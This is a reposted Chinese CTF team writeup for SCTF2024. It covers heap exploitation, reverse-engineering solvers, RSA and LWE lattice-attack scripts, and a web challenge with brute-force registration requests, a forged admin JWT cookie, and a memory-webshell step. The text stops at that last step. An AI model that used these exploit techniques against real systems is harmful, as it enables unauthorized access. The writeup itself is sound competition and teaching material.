# SCTF2024 Writeup

> 原文: https://www.ctfiot.com/211528.html
> ID: 211528

本次 SCTF 2024，我们XMCVE-Polaris战队排名第8。

排名
队伍
总分

1
W&M
13740.12

2
Project Sekai
12955.95

3
天枢Dubhe
12828.29

4
S1uM4i
12191.01

5
_0xFFF_
11602.44

6
Arr3stY0u
10102.44

7
Spirit+
10070.27

8
XMCVE-Polaris
7957.37

9
L3H Sec
7738

10
0RAYS
7669.59

task_type
func_name
address

0
new_user
0x4da620

1
show_user
0x4da910

2
delete_user
0x4da990

构造 UAF 泄漏堆地址

劫持 tcache 为堆地址，使得恰好可以控制 show_user 的指针部分。

.text:
00000000004DA910 show_user proc near ; CODE XREF: _cgo_22187f6e70a4_Cfunc_show_user+7↓j
.text:
00000000004DA910 ; DATA XREF: LOAD:
0000000000400B78↑o
.text:
00000000004DA910 ; __unwind {
.text:
00000000004DA910 endbr64
.text:
00000000004DA914 push rbx ; s
.text:
00000000004DA915 call find_user
.text:
00000000004DA91A test rax, rax
.text:
00000000004DA91D jz short loc_4DA980
.text:
00000000004DA91F cmp qword ptr [rax+100h], 0
.text:
00000000004DA927 mov rbx, rax
.text:
00000000004DA92A jz short loc_4DA960
.text:
00000000004DA92C
.text:
00000000004DA92C loc_4DA92C: ; CODE XREF: show_user+66↓j
.text:
00000000004DA92C lea rdi, aUserContent ; "user content:n"
.text:
00000000004DA933 call puts
.text:
00000000004DA938 mov edx, [rbx+10Ch]
.text:
00000000004DA93E mov rsi, [rbx+100h]
.text:
00000000004DA945 xor eax, eax
.text:
00000000004DA947 mov edi, 1
.text:
00000000004DA94C call _write
.text:
00000000004DA951 lea rdi, aShowUserConten ; "show user content success"
.text:
00000000004DA958 pop rbx
.text:
00000000004DA959 jmp puts

泄漏 puts 函数地址

利用后门函数执行shell

REVERSE

Uds

1.IDA打开uds.hex文件架构选择ARM

2.通过字符串定位到sub_80043E8函数，再case6分支中发现两个关键函数，TEA和RC4

3.sub_8104D10函数先将输入和密文进行大小端转换,再调用sub_8104CA8函数对输入进行解密然后进行比较

#include <stdio.h>
#include <stdint.h>  

int  sub_810004C(char* a1)
{
    uint8_t* v3; // r4
    char v4 = 0; // r2
    char v5 = 0; // t1
    char v6 = 0; // r3
    char v7 = 0; // t1
    char v8 = 0; // r2
    char v9 = 0; // t1
    char v10 = 0; // t1
    int count = 404;
    int index = 0;
    int index1 = 0;
    uint8_t a2[405] = { 0 };
    do
    {
        v5 = a1[index++];
        v4 = v5;
        v6 = v5 & 0xF;
        if ((v5 & 0xF) == 0)
        {
            v7 = a1[index++];
            v6 = v7;
        }
        v8 = v4 >> 4;
        if (!v8)
        {
            v9 = a1[index++];
            v8 = v9;
        }
        while (--v6)
        {
            v10 = a1[index++];
            a2[index1++] = v10;
        }
        while (--v8)
            a2[index1++] = 0;   
    } while (index1 < 404);

    for (int i = 0; i < 404; i++)
    {
        printf("%d ", a2[i]);
    }
    return 0;
}

int main() {

    char a1[40] = { 1, 19, 2, 150, 136, 0, 18, 176, 20, 166, 145, 254, 185, 215, 65, 175, 130, 204, 78, 233, 71, 71, 40, 79, 209, 66, 16, 82, 1, 88, 144, 208, 3, 0, 144, 208, 3, 2, 24, 1 };

    sub_810004C(a1);

    return 0;
}

#include <stdio.h>  
#include <string.h>  
#include <stdint.h>  

unsigned int* __fastcall sub_8104CA8_1(uint32_t* result, uint32_t* a2)
{
    unsigned int v2; // r2
    unsigned int v3; // r3
    unsigned int v4; // r4
    unsigned int i; // r5

    v2 = *result;
    v3 = result[1];
    v4 = 0;

    for (i = 0; i < 0x20; ++i)
    {
        v4 -= 0x61C88647;
        v2 += (*a2 + 16 * v3) ^ (v3 + v4) ^ (a2[1] + (v3 >> 5));
        v3 += (a2[2] + 16 * v2) ^ (v2 + v4) ^ (a2[3] + (v2 >> 5));
    }
    *result = v2;
    result[1] = v3;
    return result;
}

int main() {

    //604a8a6e 9dacb167
    uint32_t key[4] = { 0x0123,0x4567,0x89AB,0xCDEF };
    uint32_t enc[2] = { 0x11223344,0x55667788 };
    sub_8104CA8_1(enc, key);
    printf("%x %x", enc[0], enc[1]);
    return 0;
}

from Crypto.Cipher import ARC4
enc =[20,166, 145, 254, 185 ,215, 65 ,175 ,130 ,204 ,78 ,233 ,71 ,71 ,40 ,79, 209]

key = [0x60,0x4a,0x8a,0x6e,0x9d,0xac,0xb1,0x67]

rc4 = ARC4.new(bytes(key))
data = rc4.decrypt(bytes(enc))
print(data)

2.anything 方法其实就是对用户名和密码拼接的结果进行一个打乱顺序

3.transform方法对打乱后的字符做一个乘法操作

5.p和q如下rust反编译出来字符串没有被分割,但是我们可以通过下面的字符串猜测是p或者q，从而得出另一半

6.通过反射调用xor加密函数

7.generateSignature为base64加密

import base64
from Crypto.Util.number import *
key = b"S0C0Z0Y0W"
basedecode_enc = base64.b64decode("YgNxAGMDawJjZQR6B2IGYANiYQVxAG8JYQhkawZ3AW8JagluYAN2Am4GbQRmZAR6AWwBbQNlZANxCWsCaAlhZQRxAm4CbgRkZgl1AWIIawhmYAh3B2MBaAJmaghwAWoEbwliYgBwCWkIbQNuawlyAW0FYAhuYgB1Am8CawRuYAJxCG8CbgRgZAF3BWgJYQlhZwFzAGsJbwFlagV0CW0FawhgawNyCGkAbQNjYQh3Bm4FbwNkYAJ6A2IDaANmYwl2A2sEaQRlaglyAm0HaARmYQZ7AWsIbwZhYwB0B2sIYAlvYgN2AWsHYQJiZAByAGgDYANmYQB0BmwJYABhZwl1CGkEaQlmZQJzBm0IYQdjYwh6A20BbwVhZQl3CGoIaABmYAN1AW0IbQFvYAN0B2gFYAVhZAF1BW8HYQZvagZ6A20CaAhjZAl6BWkCYQhvZAN1AGgDaQJhYQZzCW8BYABjZAN0AW8BbQViZwVyA28JagJiagd1CGgDawhvYQJwB28GagNvYwd6AG0BYQFuawVyBGoBaQFkZAV1A24HbgdlYgd1AWwIYQNkagV6BW0DbglvZAl0A2kFaAhjawB3AmwAbwZgZwV3BGMEaQllYAhzAGsEYAFhYAJ6Bm4GaQdkagl6A20DawdkZgd3BW0JbgRgYQZyB2kJbANnZgdwA2gFaQFnYAh7BW4GbAdhYgd7Bm4DawJmawN0CWMDbgJgYwh0AmwGYQRiYQN2BmIGaAVkYwh2BmsDbAFhaglzB2kAbQBjZwJ1BGkCaghiZgByAWkJaAhhagZ3AG0JaghiYQVwAmMIaAFjYgVzBGh0dHA6Ly80Ny4xMDkuMTA2LjYyOjkwOTB7Im5hbWUiOiJTQ1RGIiwicGFzc3dvcmQiOiI4ODg4ODg4OCJ9")

str_index = basedecode_enc.index(b"http")
basedecode_enc = bytearray(basedecode_enc[:
str_index])

for i in range(len(basedecode_enc)):
    basedecode_enc[i] ^= key[i % len(key)]

str_all = "10669721913248017310606431714870563867652912174255756" + "77708576877293974468987904515774877239910831730102424168632380997160447756586819818214079227220527789589428918310335" + "12463262741053961681512908218003840408526915629689432111480588966800949428079015682624591636010678691927285321708935" + "07622195117342689483616914481942446584230780635367254734412529071675353523965841788382894123250962283869276191721180" + "69630111688222816660336951574265158642655270462133261451743980188590564394314228679570791499675920788944100826957141" + "60599647180947207504108618794637872261572262805565517756922288320779308895819726074229154002310375209"
str_1 = "144819424465842307806353672547344125290716753535239658417883828941232509622838692761917211806963011168822281666033695157426515864265527046213326145174398018859056439431422867957079149967592078894410082695714160599647180947207504108618794637872261572262805565517756922288320779308895819726074229154002310375209"

p = int(str_all[str_all.index(str_1):])
q = int(str_all[:
str_all.index(str_1)])
e = 65537
n = p * q
f = (p - 1) * (q - 1)
d = inverse(e,f)
c = int(basedecode_enc.decode())
m = str(pow(c,d,n))

enc2 = m.replace("00"," ").split(" ")[:-1]
flag = ""
for i in enc2:
    flag += chr(int(i))

index = "gahbicjdlemfn"
table = "abcdefghijlmn"

for i in range(len(flag)):
    print(flag[index.index(table[i])],end="")

Crypto

Signin

题目把phi的表达式隐藏了，注意到e的数量级大概是n的两倍，以及题目给出gift = (p^2 + p + 1)*(q^2 + q + 1)

猜测phi = (p^2 + p + 1)*(q^2 + q + 1)，

# sage 10.3
import itertools
from Crypto.Util.number import *

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()
    R = f.base_ring()
    N = R.cardinality()
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)
    G = Sequence([], f.parent())
    for i in range(m + 1):
        base = N ^ (m - i) * f ^ i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)
    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)
    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)
    B = B.dense_matrix().LLL()
    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1 / factor)
    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B * monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []

n = int("06 7f 0a a4 e9 74 a6 3a 1f fe 8d 5c 23 e5 d3 c4 31 65 3a e4 1c c7 46 f3 05 f6 2a 9f 19 3f 22 48 6c b7 ef 1b 27 56 34 81 8f 46 d0 75 2a 51 39 e1 99 18 27 1f a0 d7 d2 7b c6 60 d2 b7 24 14 d0 8e a5 2c 88 37 f9 49 c7 ba ec c3 02 9b a3 17 27 ef 3b f1 20 d9 92 6c 02 d7 41 2f 18 7e 98 dc 56 dd 07 b9 87 d2 cc 19 1a d5 61 64 a1 44 f2 8b 2f 70 a1 5d 10 55 88 a4 f2 7f bb 28 91 fc 52 7b d6 89 0a 5f 79 5b 5c 48 47 6a 6b f9 df b6 7b 7e 1e bc 7b 1b 08 6c d2 8b 58 c6 89 55 bf df 44 ec ce 11 ff ac df 65 45 51 b1 59 b7 83 20 40 cc 28 ee 8e be a4 8f 86 72 d5 3e 3d e8 8f cf bb 5f b2 76 b5 03 88 0d d3 4d 59 93 33 5d df 8c cb 96 c1 b4 d7 9f 50 2d 72 10 47 65 ad 9c 2b 18 58 a1 7a f3 d5 be 44 fa 3c bf 4b 8e eb 94 2a a3 94 2a 38 71 d2 c6 5a c7 02 89 12 3f c2 e9 f9 b2 5c bf cb d7 84 10 96 06 0f a5 04 c3 a0 7b 59 14 93 c6 4c 88 d0 bb 45 28 5a 85 b5 f7 d5 9d b9 8f aa 00 c2 cd 3f bb 63 da 59 92 05 f1 ca b0 df 52 cf 7b 43 1a 0e e4 a7 e3 56 96 54 6c e9 d0 3e f5 95 ec ee 92 d2 14 2c 92 e9 7d 27 44 93 97 03 45 5b 4c 70 de c2 7c 32 1e c6 b8 3c 02 96 22 e8 3a 9e 0d 55 d0 b2 58 d9 5d 4e 61 29 18 65 dd a7 6d c6 19 fc e9 57 79 90 42 9c 6e 77 e9 d4 07 81 e3 b2 f4 49 70 1b 83 e8 b0 c6 c6 6e b3 80 f9 64 73 e5 d4 22 ef ee 8b 2b 0e 88 b7 16 b0 0a 79 c9 d5 14 ca 3a d9 d2 de e5 26 60 9f f9 54 17 32 a4 19 8d 11 b9 db fb b2 e5 5c 24 d8 0e a5 22 d0 78 6e 33 55 f2 36 06 a5 d3 8a 72 de 4e ef c8 b6 bf c4 82 24 8a 28 62 cb 69 d8 e0 e3 d3 16 59 7d a9 d8 08 28 be 85 05 4f af 15 fc 36 9c aa ca fb 81 5c 69 73 c1 71 94 06 83 d5 6a 1a 19 67 b0 9b 7f fa 3f be 5b 2e 08 69 97 59 d8 4d 71 60 3f 51 64 47 69 6b b2 73 22 a6 9f 39 f6 ca 25 3e 00 dc 95 55 d5 f9 73 28 07 0c 46 7f 36 63 cc 48 9a ad 13 0f 28 c4 2f 35 bf 88 c5 71 92 0a b9 2a cb 8f 75 d0 3e 35 a7 51 03 c5 bd 96 f0 61 c9 6b d0 2a f6 e1 d1 91 b0 dd 16 4b c7 21 37 70 03 ed bf 5d 3e f6 5a 5e 90 46 38 53 56 b5 21 62 3b ee 37 f1 64 85 0a 0a 7a fb 0e d4 e7 e8 bd 9a fe 12 98 f7 d5 32 bc 9a d9 41 81 2d 33 2a ec e7 5d 1c cc b1 ff 69 fd 42 b3 1f 24 8a e5 79 d9 e0 d6 a1 4b 05 46 e7 84 ba 94 0e 32 bd 01 c3 95 df 8f f4 58 40 40 46 2b 54 79 fa 07 33 6d 50 3d c3 32 e7 0f c0 6d 94 63 29 7f c0 42 b6 23 d5 6f 87 ef aa 52 5a 9b 58 0e 31 4d 90 d1 21 18 93 ed 40 7a 26 50 8d ea a0 a1 3c 9e e8 c9 02 b9 e1 c3 a0 2f e9 a5 14 52 c0 2e e7 bd cc 85 c0 ef f6 38 91 e2 47 03 bd 26 5d 9c 9d bf 45 6e 2a f9 40 95 38 bc e0 fe cc 7e ba b2 02 66 aa ab 06 c7 66 c3 ea 6c da 9c b9 ba 5e 1d 02 4b 7d c3 d7 3e 76 f6 a3 33 19 7b ad 87 c4 fb 34 d5 65 a0 01 4a ac 72 82 5e 41 ad cf ea da dc 87 ac ef 40 ad 84 b7 c5 56 91 ab ad 56 1b e0 55 0e a0 a9 88 47 0c 42 74 32 ac b8 fe b2 b9 d2 d2 59 8f b2 08 9b b9 1b bd 9c b1 99 e8 92 d3 61 64 d8 bf 3e cd 54 57 6a 97 13 40 47 a1 2d a8 42 07 48 5b b4 e5".replace(" ",""),16)
c = 145554802564989933772666853449758467748433820771006616874558211691441588216921262672588167631397770260815821197485462873358280668164496459053150659240485200305314288108259163251006446515109018138298662011636423264380170119025895000021651886702521266669653335874489612060473962259596489445807308673497717101487224092493721535129391781431853820808463529747944795809850314965769365750993208968116864575686200409653590102945619744853690854644813177444995458528447525184291487005845375945194236352007426925987404637468097524735905540030962884807790630389799495153548300450435815577962308635103143187386444035094151992129110267595908492217520416633466787688326809639286703608138336958958449724993250735997663382433125872982238289419769011271925043792124263306262445811864346081207309546599603914842331643196984128658943528999381048833301951569809038023921101787071345517702911344900151843968213911899353962451480195808768038035044446206153179737023140055693141790385662942050774439391111437140968754546526191031278186881116757268998843581015398070043778631790328583529667194481319953424389090869226474999123124532354330671462280959215310810005231660418399403337476289138527331553267291013945347058144254374287422377547369897793812634181778309679601143245890494670013019155942690562552431527149178906855998534415120428884098317318129659099377634006938812654262148522236268027388683027513663867042278407716812565374141362015467076472409873946275500942547114202939578755575249750674734066843408758067001891408572444119999801055605577737379889503505649865554353749621313679734666376467890526136184241450593948838055612677564667946098308716892133196862716086041690426537245252116765796203427832657608512488619438752378624483485364908432609100523022628791451171084583484294929190998796485805496852608557456380717623462846198636093701726099310737244471075079541022111303662778829695340275795782631315412134758717966727565043332335558077486037869874106819581519353856396937832498623662166446395755447101393825864584024239951058366713573567250863658531585064635727070458886746791722270803893438211751165831616861912569513431821959562450032831904268205845224077709362068478
ph = int("80 63 d0 a2 18 76 e5 ce 1e 21 01 c2 00 15 52 90 66 ed 99 76 88 2d 10 02 a2 9e fe 0f 2f df cc 27 43 fc 9a 4b 5b 65 1c c9 71 08 69 9e ca 2f b1 f3 d9 31 75 ba e3 43 e7 c9 2e 4a 41 c7 2d 05 e5 70 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ".replace(" ",""),16)
qh = int("e4 f0 fe 49 f9 ae 14 92 c0 97 a0 a9 88 fa 71 87 66 25 fe 4f ce 05 b0 20 4f 1f df 43 ec 64 b4 da c6 99 d2 8e 16 6e fd fc 75 62 d1 9e 58 c3 49 3d 91 00 36 5c f2 84 0b 46 c0 f6 ee 8d 96 48 07 17 0f f2 c1 3c 4e b8 01 2e ca b3 78 62 a3 90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00".replace(" ",""),16)
e = 65537

R.<x,y> = PolynomialRing(Zmod(n))
f = (ph + x)^5 * (qh + y)^2
res = small_roots(f,(2^496,2^400),m=2,d=3)
print(res)
root = res[0]
p = ph + root[0]
q = qh + root[1]

phi = p^4*(p-1)*q*(q-1)
d = inverse(e,phi)
m = pow(c,d,n)
print(long_to_bytes(m))
# SCTF{0ne_4rgum3nt_1s_r0tt3n_0r4ng3s,_th3_wh0le_cert1fic4t3_1s_r0tt3n_0r4ng3s:XD}

Whisper

和上题一样的思路把私钥文件先解析出来

cert1.pem

30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
    02 81 80
1b5d4fe0aa6782e275d4ce12a6d57562efbbe7db6f5277255b891729bfa2a18d
3edb49843d7989a37b9516be2df8ca939058e65f64b5fb2071bea4f5f8d13928
95b32bf0377d99f4f79979125e5db01cdb5080a1c2d665c9ac31b5823025499c
9513277bae5e7a846cd271c4396e2ba219020e58a9055cb18a28d36a00bf717b
    02 81 80
079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143

cert2.pem

30 82 01 1e 30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82 01 0b 00 30 82 01 06
    02 81 80
071c324e8769493187c15f72d5cc695729b48488ee3fbd01db00d5c478f08c7c
f32093ba61745051d3e9d169523aa91438181f47679aff5edd22950f74a1eb14
43320aaa5d97f5c1e81b5ef9a3e69ba669abc4c6c4b405f5088a603a74f9bcef
88823b4523574114c810600838728196f8e5e0d4aeeeeab79dd8683a72f3c017
    02 81 80
079f5ccc665767b4a257e5c1ff56e9803df2e5650302daad420105fe67244774
3bd3f0bea1c46a4987932e9a886ca87a7afd7796abf1e5629c4986fe4f22e89c
dce7abb06624465146a2e2b6ca9ab3196ceab7467974c1dc45608a200411b291
fdaf99f7d80dce4db3566f4a9e2e574c6224cd07d80638d28f7820bcf4b49143

这题看下两个e是一样的，但是n不一样，而且题目说了有个关键的参数是345bit，大概率是d，所以猜测只有一组e,d。了解到Dual RSA——双生RSA，对偶RSA | 独奏の小屋 (hasegawaazusa.github.io)

https://github.com/xalanq/jarvisoj-solutions/blob/master/crypto/%5B61dctf%5Drsa.md链接中的脚本改为python3即可得到d

Exp

from sage.all import *
import itertools

# display matrix picture with 0 and X
def matrix_overview(BB):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += ' ' if BB[ii, jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        print(a)

def dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt):
    '''
    Attack to Dual RSA: Liqiang et al.'s attack implementation
    '''

    N = (n1 + n2) // 2
    A = ZZ(floor(N^0.5))

    _XX = ZZ(floor(N^delta))
    _YY = ZZ(floor(N^0.5))
    _ZZ = ZZ(floor(N^(delta - 1./4)))
    _UU = _XX * _YY + 1

    # Find a "good" basis satisfying d = a1 * l'11 + a2 * l'21
    M = Matrix(ZZ, [[A, e], [0, n1]])
    B = M.LLL()
    l11, l12 = B[0]
    l21, l22 = B[1]
    l_11 = ZZ(l11 / A)
    l_21 = ZZ(l21 / A)

    modulo = e * l_21
    F = Zmod(modulo)

    PR = PolynomialRing(F, 'u, x, y, z')
    u, x, y, z = PR.gens()

    PK = PolynomialRing(ZZ, 'uk, xk, yk, zk')
    uk, xk, yk, zk = PK.gens()

    # For transform xy to u-1 (unravelled linearlization)
    PQ = PK.quo(xk*yk+1-uk)

    f = PK(x*(n2 + y) - e*l_11*z + 1)
    fbar = PQ(f).lift()

    # Polynomial construction
    gijk = {}
    for k in range(0, mm + 1):
        for i in range(0, mm - k + 1):
            for j in range(0, mm - k - i + 1):
                gijk[i, j, k] = PQ(xk^i * zk^j * PK(fbar) ^ k * modulo^(mm-k)).lift()

    hjkl = {}
    for j in range(1, tt + 1):
        for k in range(floor(mm / tt) * j, mm + 1):
            for l in range(0, k + 1):
                hjkl[j, k, l] = PQ(yk^j * zk^(k-l) * PK(fbar) ^ l * modulo^(mm-l)).lift()

    monomials = []
    for k in gijk.keys():
        monomials += gijk[k].monomials()
    for k in hjkl.keys():
        monomials += hjkl[k].monomials()

    monomials = sorted(set(monomials))[::-1]
    assert len(monomials) == len(gijk) + len(hjkl)  # square matrix?
    dim = len(monomials)

    # Create lattice from polynomial g_{ijk} and h_{jkl}
    M = Matrix(ZZ, dim)
    row = 0
    for k in gijk.keys():
        for i, monomial in enumerate(monomials):
            M[row, i] = gijk[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)
        row += 1
    for k in hjkl.keys():
        for i, monomial in enumerate(monomials):
            M[row, i] = hjkl[k].monomial_coefficient(monomial) * monomial.subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ)
        row += 1

    matrix_overview(M)
    print('=' * 128)

    # LLL
    B = M.LLL()

    matrix_overview(B)

    # Construct polynomials from reduced lattices
    H = [(i, 0) for i in range(dim)]
    H = dict(H)
    for j in range(dim):
        for i in range(dim):
            H[i] += PK((monomials[j] * B[i, j]) / monomials[j].subs(uk=_UU, xk=_XX, yk=_YY, zk=_ZZ))
    H = list(H.values())

    PQ = PolynomialRing(QQ, 'uq, xq, yq, zq')
    uq, xq, yq, zq = PQ.gens()

    # Inversion of unraveled linearization
    for i in range(dim):
        H[i] = PQ(H[i].subs(uk=xk*yk+1))

    # Calculate Groebner basis for solve system of equations
    I = Ideal(*H[1:20])
    g = I.groebner_basis('giac')[::-1]
    mon = list(map(lambda t: t.monomials(), g))

    PX = PolynomialRing(ZZ, 'xs')
    xs = PX.gen()

    x_pol = y_pol = z_pol = None

    for i in range(len(g)):
        if mon[i] == [xq, 1]:
            print(g[i] / g[i].lc())
            x_pol = g[i] / g[i].lc()
        elif mon[i] == [yq, 1]:
            print(g[i] / g[i].lc())
            y_pol = g[i] / g[i].lc()
        elif mon[i] == [zq, 1]:
            print(g[i] / g[i].lc())
            z_pol = g[i] / g[i].lc()

    if x_pol is None or y_pol is None or z_pol is None:
        print('[-] Failed: we cannot get a solution...')
        return

    x0 = x_pol.subs(xq=xs).roots()[0][0]
    y0 = y_pol.subs(yq=xs).roots()[0][0]
    z0 = z_pol.subs(zq=xs).roots()[0][0]

    # solution check
    assert f(x0 * y0 + 1, x0, y0, z0) % modulo == 0

    a0 = z0
    a1 = (x0 * (n2 + y0) + 1 - e * l_11 * z0) / (e * l_21)

    d = a0 * l_11 + a1 * l_21
    return d

if __name__ == '__main__':
    delta = 0.334
    mm = 4
    tt = 2

    n1 = int("1b 5d 4f e0 aa 67 82 e2 75 d4 ce 12 a6 d5 75 62 ef bb e7 db 6f 52 77 25 5b 89 17 29 bf a2 a1 8d 3e db 49 84 3d 79 89 a3 7b 95 16 be 2d f8 ca 93 90 58 e6 5f 64 b5 fb 20 71 be a4 f5 f8 d1 39 28 95 b3 2b f0 37 7d 99 f4 f7 99 79 12 5e 5d b0 1c db 50 80 a1 c2 d6 65 c9 ac 31 b5 82 30 25 49 9c 95 13 27 7b ae 5e 7a 84 6c d2 71 c4 39 6e 2b a2 19 02 0e 58 a9 05 5c b1 8a 28 d3 6a 00 bf 71 7b ".replace(" ",""),16)
    e = int("07 9f 5c cc 66 57 67 b4 a2 57 e5 c1 ff 56 e9 80 3d f2 e5 65 03 02 da ad 42 01 05 fe 67 24 47 74 3b d3 f0 be a1 c4 6a 49 87 93 2e 9a 88 6c a8 7a 7a fd 77 96 ab f1 e5 62 9c 49 86 fe 4f 22 e8 9c dc e7 ab b0 66 24 46 51 46 a2 e2 b6 ca 9a b3 19 6c ea b7 46 79 74 c1 dc 45 60 8a 20 04 11 b2 91 fd af 99 f7 d8 0d ce 4d b3 56 6f 4a 9e 2e 57 4c 62 24 cd 07 d8 06 38 d2 8f 78 20 bc f4 b4 91 43".replace(" ",""),16)
    n2 = int("07 1c 32 4e 87 69 49 31 87 c1 5f 72 d5 cc 69 57 29 b4 84 88 ee 3f bd 01 db 00 d5 c4 78 f0 8c 7c f3 20 93 ba 61 74 50 51 d3 e9 d1 69 52 3a a9 14 38 18 1f 47 67 9a ff 5e dd 22 95 0f 74 a1 eb 14 43 32 0a aa 5d 97 f5 c1 e8 1b 5e f9 a3 e6 9b a6 69 ab c4 c6 c4 b4 05 f5 08 8a 60 3a 74 f9 bc ef 88 82 3b 45 23 57 41 14 c8 10 60 08 38 72 81 96 f8 e5 e0 d4 ae ee ea b7 9d d8 68 3a 72 f3 c0 17 ".replace(" ",""),16)
    c = bytes_to_long(open("ciphertext.txt",'rb').read())

    d = dual_rsa_liqiang_et_al(e, n1, n2, delta, mm, tt)
    print(f"d = {d}")
    m1 = pow(c,int(d),n1)
    m2 = pow(c,int(d),n2)
    flag1 = long_to_bytes(m1)
    flag2 = long_to_bytes(m2)
    
    print(flag1)
    print(flag2)
    # SCTF{Ju5t_3njoy_th3_Du4l_4nd_Copper5m1th_m3thod_w1th_Ur_0wn_1mplem3nt4t10n}

LinearARTs

只需要解LWE即可得到flag。题目已经给出b和AA。

其中AA = A * D * PM

这个式子中，D和PM都已知，乘一下逆矩阵就能得到A

然后套板子就能得到flag了

Exp

# sage 10.3
from sage.groups.perm_gps.permgroup_named import SymmetricGroup
from sage.all import *
from random import choices
import json
from Crypto.Util.number import *

q = 65537
Sn = SymmetricGroup(5*5)
Per = (1,23,2,13,3,16,15,6,22,18,14,4,25,11,20,24,21,9,5,17,7,19,10,12,8)

P = PermutationGroupElement(Per)
PM = Matrix(GF(q),P.matrix())

f1 = open("LinearARTs/output.txt",'r').read()
data1 = json.loads(f1)
f2 = open("LinearARTs/D.matrix",'r').read()
data2 = json.loads(f2)

AA = Matrix(GF(q),eval(data1['AA']))
b = vector(GF(q),eval(data1['b']))
D = Matrix(GF(q),eval(data2['D']))

# AA = A*D*PM
A = AA * PM.inverse() * D.inverse()

def primal_attack2(A,b,m,n,p,esz):
    L = block_matrix(
        [
            [matrix(Zmod(p), A).T.echelon_form().change_ring(ZZ), 0],
            [matrix.zero(m - n, n).augment(matrix.identity(m - n) * p), 0],
            [matrix(ZZ, b), 1],
        ]
    )
    Q = diagonal_matrix([1]*m + [esz])
    L *= Q
    L = L.LLL()
    L /= Q
    for res in L:
        if(res[-1] == 1):
            e = vector(GF(p), res[:m])
        elif(res[-1] == -1):
            e = -vector(GF(p), res[:m])
        
        s = matrix(Zmod(p), A).solve_right((vector(Zmod(p), b) - e))
        
        ss = vector(ZZ,s).list()
        msg = 0
        for i in range(len(ss)):
            msg += ss[i] * 65537**i

        flag = long_to_bytes(int(msg))
        if b"SCTF" in flag:
            print(flag)
            return
        
m = 625
n = 25
primal_attack2(A,b,m,n,q,1)
# SCTF{HunYu4n_TaiChi-5tyl3_P3rmut4t10nProup_m4st3r}

WEB

ezRender

抓取注册请求包 （爆破2048个以上）

POST /register HTTP/1.1
Host: 124.220.229.60:
8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://124.220.229.60:
8080/register
Content-Type: application/json
Content-Length: 42
Origin: http://124.220.229.60:
8080
Connection: close
Priority: u=0

{"username":"admin§1§","password":"admin123"}

时间戳获取

time_string 为admin2060时服务器返回的时间戳

import time
from datetime import datetime

# 指定时间字符串
time_string = "Sun, 29 Sep 2024 06:03:45 GMT"  

# 转换为时间戳
timestamp = int(time.mktime(time.strptime(time_string, "%a, %d %b %Y %H:%M:%S %Z")))

# 打印时间戳
print(timestamp) 

构造token

secret_key为上一步的时间戳

import json
import hashlib
import base64
import jwt
from app import *
from User import *

def generateToken(user):
    secret={"name":
user,"is_admin":"1"}
    
    verify_c=jwt.encode(secret, secret_key, algorithm='HS256')
    infor={"name":
user,"secret":
verify_c}
    token=base64.b64encode(json.dumps(infor).encode()).decode()
    print(infor)
    print(token)

secret_key="1727589825"
generateToken('admin2060')

替换cookie即可

伪造玩JWT后，删除部分用户，使存在的用户少于2048个

POST /removeUser HTTP/1.1
Host: 1.95.40.5:
29351
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:
130.0) Gecko/20100101 Firefox/130.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Cookie: Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==
Referer: http://124.220.229.60:
8080/register
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://124.220.229.60:
8080
Connection: close
Priority: u=0

username=admin§1§

code为传恶意代码的地方，使用内存马读取flag

POST /admin HTTP/1.1
Host: 1.95.40.5:
29351
